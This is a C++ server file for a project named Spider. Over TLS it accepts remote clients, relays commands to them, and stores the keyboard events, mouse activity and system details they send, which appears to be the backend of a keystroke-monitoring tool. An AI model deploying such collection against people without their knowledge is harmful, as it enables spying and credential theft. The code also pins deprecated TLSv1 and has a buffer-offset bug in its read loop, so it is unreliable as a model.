#include <algorithm>
#include "SpiderServer.h"
#include "Logger.hpp"
#include "IClient.hpp"

namespace spider
{
  namespace server
  {
    SpiderServer::SpiderServer(CommandCenter &      cmdCenter,
                               volatile bool const &running,
                               std::uint16_t        port)
        : m_dataPort(port + 1), m_controllers(), m_clients(),
          m_cmdCenter(cmdCenter), m_running(running),
#if defined __linux__
          m_cmdCtx(SSL_CTX_new(TLSv1_server_method())),
          m_dataCtx(SSL_CTX_new(TLSv1_server_method())),
#else
          m_cmdCtx(SSL_CTX_new(TLSv1_server_method())),
          m_dataCtx(SSL_CTX_new(TLSv1_server_method())),
#endif
          m_tcpSocket(port, 64, ::network::ASocket::SocketType::BLOCKING,
                      m_cmdCtx),
          m_tcpDataSocket(port + 1, 64,
                          ::network::ASocket::SocketType::BLOCKING, m_dataCtx),
          m_commandQueue(), m_curClients(0), m_storage(), m_readfds(),
          m_writefds(), m_exceptfds()
    {
      if (!m_tcpSocket.openConnection("./spider.key", "./spider.crt") ||
          !m_tcpDataSocket.openConnection("./spider.key", "./spider.crt"))
	{
	  throw std::runtime_error("Cannot initialize connection");
	}
    }

    void SpiderServer::addController(AControl &controller)
    {
      m_controllers.push_back(&controller);
    }

    void SpiderServer::run()
    {
      nope::log::Log(Info) << "Starting Spider server";

      while (m_running)
	{
	  using namespace std::chrono_literals;

	  // Get commands
	  for (auto *ctrl : m_controllers)
	    {
	      Event ev;
	      ev.response.setNbClient(
	          static_cast<std::uint32_t>(m_clients.size()));
	      while (ctrl->pollEvent(ev))
		{
		  // Link to correct client
		  if (ev.destId < m_clients.size())
		    {
		      ev.dest = m_clients[ev.destId].get();
		      ev.dest->sendEvent(ev);
		    }
		}
	    }

	  // Execute event, if needed
	  for (auto &cli : m_clients)
	    {
	      cli->execute();
	    }

	  int32_t const rc = multiplex();
	  if (rc < 0)
	    {
	      break;
	    }
	  else if (rc)
	    {
	      treatEvents();
	    }

	  // Write datas
	  m_storage.write();
	}

      nope::log::Log(Info) << "Stopping Spider server";
    }

    std::int32_t SpiderServer::multiplex()
    {
      std::int32_t       rc = 0;
      std::int32_t const sock = m_tcpSocket.getSocket();
      std::int32_t const sockData = m_tcpDataSocket.getSocket();

      do
	{
	  std::int32_t   maxSock = (sock > sockData) ? sock : sockData;
	  struct timeval tv;

	  FD_ZERO(&m_readfds);
	  FD_ZERO(&m_writefds);
	  tv.tv_sec = 0;
	  tv.tv_usec = 50;

	  FD_SET(sock, &m_readfds);
	  FD_SET(sockData, &m_readfds);

	  for (auto const &cli : m_clients)
	    {
	      if (cli->canWrite())
		{
		  FD_SET(cli->getSocket(), &m_writefds);
		}
	      FD_SET(cli->getSocket(), &m_readfds);
	      if (maxSock < cli->getSocket())
		{
		  maxSock = cli->getSocket();
		}
	    }

	  for (auto const &cli : m_clientsData)
	    {
	      FD_SET(cli->getSocket(), &m_readfds);
	      if (maxSock < cli->getSocket())
		{
		  maxSock = cli->getSocket();
		}
	    }

	  m_exceptfds = m_readfds;
	  rc = select(maxSock + 1, &m_readfds, &m_writefds, &m_exceptfds, &tv);
	}
      while (rc == -1 && errno == EINTR);
      return (rc);
    }

    void SpiderServer::treatEvents()
    {
      if (FD_ISSET(m_tcpSocket.getSocket(), &m_readfds))
	{
	  addClient();
	}
      if (FD_ISSET(m_tcpDataSocket.getSocket(), &m_readfds))
	{
	  addClientData();
	}

      // Treat client's commands
      for (std::vector<std::unique_ptr<Client>>::iterator ite =
               m_clients.begin();
           ite != m_clients.end();)
	{
	  bool         deleted = false;
	  Client &     cli = **ite;
	  sock_t const sock = cli.getSocket();

	  if (FD_ISSET(sock, &m_readfds))
	    {
	      // Handle input
	      ::network::IClient::ClientAction action;

	      nope::log::Log(Info) << "Can read from socket #" << sock;
	      action = cli.treatIncomingData();
	      if (action != ::network::IClient::ClientAction::SUCCESS)
		{
		  removeClient(cli);
		  deleted = true;
		}
	    }
	  if (deleted == false && FD_ISSET(sock, &m_writefds))
	    {
	      // Handle output
	      ::network::IClient::ClientAction action;

	      nope::log::Log(Info) << "Can write to socket #" << sock;
	      action = cli.treatOutgoingData();
	      if (action == ::network::IClient::ClientAction::DISCONNECT)
		{
		  removeClient(cli);
		  deleted = true;
		}
	    }
	  if (deleted == false && FD_ISSET(sock, &m_exceptfds))
	    {
	      // Handle exception
	      removeClient(cli);
	      deleted = true;
	    }

	  // Check if we deleted anything
	  if (!deleted)
	    {
	      ++ite;
	    }
	}

      // Treat client's datas
      for (std::vector<std::unique_ptr<::network::TCPSocket>>::iterator ite =
               m_clientsData.begin();
           ite != m_clientsData.end();)
	{
	  bool                  deleted = false;
	  ::network::TCPSocket &cli = **ite;
	  sock_t const          sock = cli.getSocket();

	  if (FD_ISSET(sock, &m_readfds))
	    {
	      // Handle input
	      ::network::IClient::ClientAction action;

	      nope::log::Log(Info) << "Can read from socket #" << sock;
	      action = readData(cli);
	      if (action != ::network::IClient::ClientAction::SUCCESS)
		{
		  removeClientData(cli);
		  deleted = true;
		}
	    }
	  if (deleted == false && FD_ISSET(sock, &m_exceptfds))
	    {
	      // Handle exception
	      removeClientData(cli);
	      deleted = true;
	    }

	  // Check if we deleted anything
	  if (!deleted)
	    {
	      ++ite;
	    }
	}
    }

    bool SpiderServer::readSize(::network::TCPSocket &sock, std::uint8_t *data,
                                size_t const size)
    {
      size_t totalLen = 0;

      while (totalLen != size)
	{
	  ssize_t readLen;

	  if (!sock.rec(data, size, &readLen) || !readLen)
	    {
	      return false;
	    }
	  totalLen += static_cast<std::size_t>(readLen);
	}
      return true;
    }

    // Read a data packet and store it
    ::network::IClient::ClientAction
        SpiderServer::readData(::network::TCPSocket &sock)
    {
      auto ret = ::network::IClient::ClientAction::SUCCESS;
      network::tcp::PacketHeader header;

      // Read header
      if (!readSize(sock, reinterpret_cast<std::uint8_t *>(&header),
                    sizeof(header)))
	{
	  ret = ::network::IClient::ClientAction::FAILURE;
	}

      if (ret == ::network::IClient::ClientAction::SUCCESS)
	{
#if defined SPIDER_SERIALIZE
#if defined __linux__
	  header.time = be64toh(header.time);
#else
	  header.time = ntohll(header.time);
#endif

#else
	  header.time = header.time;
#endif
	  switch (header.type)
	    {
	    case network::tcp::PacketType::KeyboardEvent:
// Explicit fallthrough
#if __has_cpp_attribute(fallthrough)
	      [[fallthrough]];
#elif defined __clang__
	      [[clang::fallthrough]];
#elif defined __GNUC__ && __GNUC__ >= 7
	      __attribute__((fallthrough));
#else
#endif
	    case network::tcp::PacketType::MouseButton:
	      {
		network::tcp::PacketEvent ev;

		if (!readSize(sock, reinterpret_cast<std::uint8_t *>(&ev),
		              sizeof(ev)))
		  {
		    ret = ::network::IClient::ClientAction::FAILURE;
		  }
		else
		  {
#if defined SPIDER_SERIALIZE
		    ev.key = ntohl(ev.key);
#else
		    ev.key = ev.key;
#endif
		    EventStorage store;

		    store.header = header;
		    store.ev = ev;
		    m_storage.push(store);
		  }
	      }
	      break;
	    case network::tcp::PacketType::MousePosition:
	      {
		network::tcp::PacketMov ev;

		if (!readSize(sock, reinterpret_cast<std::uint8_t *>(&ev),
		              sizeof(ev)))
		  {
		    ret = ::network::IClient::ClientAction::FAILURE;
		  }
		else
		  {
#if defined SPIDER_SERIALIZE
		    ev.posX = ntohl(ev.posX);
		    ev.posY = ntohl(ev.posY);
#else
		    ev.posX = ev.posX;
		    ev.posY = ev.posY;
#endif

		    EventStorage store;

		    store.header = header;
		    store.mov = ev;
		    m_storage.push(store);
		  }
	      }
	      break;
	    case network::tcp::PacketType::Screenshot:
	      {
		// TODO: Not implemented yet
	      }
	      break;
	    case network::tcp::PacketType::Infos:
	      {
		network::tcp::PacketInfos ev;

		if (!readSize(sock, reinterpret_cast<std::uint8_t *>(&ev),
		              sizeof(ev)))
		  {
		    ret = ::network::IClient::ClientAction::FAILURE;
		  }
		else
		  {
#if defined SPIDER_SERIALIZE
		    ev.procArch = ntohs(ev.procArch);
		    ev.pageSize = ntohl(ev.pageSize);
		    ev.nbProc = ntohs(ev.nbProc);

#if defined __linux__
		    ev.ram = be64toh(ev.ram);
#else
		    ev.ram = ntohll(ev.ram);
#endif
#else
		    ev.procArch = ev.procArch;
		    ev.pageSize = ev.pageSize;
		    ev.nbProc = ev.nbProc;
		    ev.ram = ev.ram;
#endif

		    EventStorage store;

		    store.header = header;
		    store.infos = ev;
		    m_storage.push(store);
		  }
	      }
	      break;
	    }
	}
      return ret;
    }

    bool SpiderServer::addClient()
    {
      bool          ret = false;
      std::int32_t  rc = 0;
      sockaddr_in_t in = {};
      sock_t const  sock = m_tcpSocket.getSocket();

      nope::log::Log(Info) << "There's client to accept on socket #" << sock;
      do
	{
	  socklen_t len = sizeof(in);
	  rc = ::accept(sock, reinterpret_cast<sockaddr_t *>(&in), &len);
	}
      while (rc == -1 && errno == EINTR);

      // Check if the socket is valid
      if (rc > 0)
	{
	  try
	    {
	      m_clients.push_back(
	          std::make_unique<Client>(rc, m_cmdCenter, m_clients.size(),
	                                   m_tcpSocket.getCTX(), m_dataPort));
	      nope::log::Log(Info)
	          << "Added client FD #" << m_clients.back()->getSocket();
	      nope::log::Log(Info)
	          << "New client connected #" << m_clients.back()->getId();
	      ++m_curClients;
	      nope::log::Log(Info)
	          << "There are now " << m_curClients << " clients.";
	      ret = true;
	    }
	  catch (std::exception const &e)
	    {
	      ret = false;
	      nope::log::Log(Error) << e.what();
	    }
	}
      return (ret);
    }

    bool SpiderServer::addClientData()
    {
      bool          ret = false;
      std::int32_t  rc = 0;
      sockaddr_in_t in = {};
      sock_t const  sock = m_tcpDataSocket.getSocket();

      nope::log::Log(Info) << "There's client to accept on socket #" << sock;
      do
	{
	  socklen_t len = sizeof(in);
	  rc = ::accept(sock, reinterpret_cast<sockaddr_t *>(&in), &len);
	}
      while (rc == -1 && errno == EINTR);

      // Check if the socket is valid
      if (rc > 0)
	{
	  try
	    {
	      m_clientsData.push_back(std::make_unique<::network::TCPSocket>(
	          rc, SSL_new(m_tcpDataSocket.getCTX()),
	          m_tcpDataSocket.getCTX()));
	      nope::log::Log(Info) << "Added clientData FD #"
	                           << m_clientsData.back()->getSocket();
	      ret = true;
	    }
	  catch (std::exception const &e)
	    {
	      ret = false;
	      nope::log::Log(Error) << e.what();
	    }
	}
      return (ret);
    }

    void SpiderServer::removeClient(Client &cli)
    {
      nope::log::Log(Info) << "Removing Client";
      nope::log::Log(Info) << "Client disconnected #" << cli.getId();
      cli.disconnect();

      // Remove asked element
      m_clients.erase(std::remove_if(m_clients.begin(), m_clients.end(),
                                     [&](std::unique_ptr<Client> const &o) {
	                               return (*o == cli);
	                             }),
                      m_clients.end());
      --m_curClients;
      nope::log::Log(Info) << "There are now " << m_curClients << " clients.";
    }

    void SpiderServer::removeClientData(::network::TCPSocket const &sock)
    {
      // Remove asked element
      m_clientsData.erase(
          std::remove_if(m_clientsData.begin(), m_clientsData.end(),
                         [&](std::unique_ptr<::network::TCPSocket> const &o) {
	                   return (*o == sock);
	                 }),
          m_clientsData.end());
    }

    std::vector<std::unique_ptr<Client>> const &
        SpiderServer::getClients() const
    {
      return (m_clients);
    }
  }
}
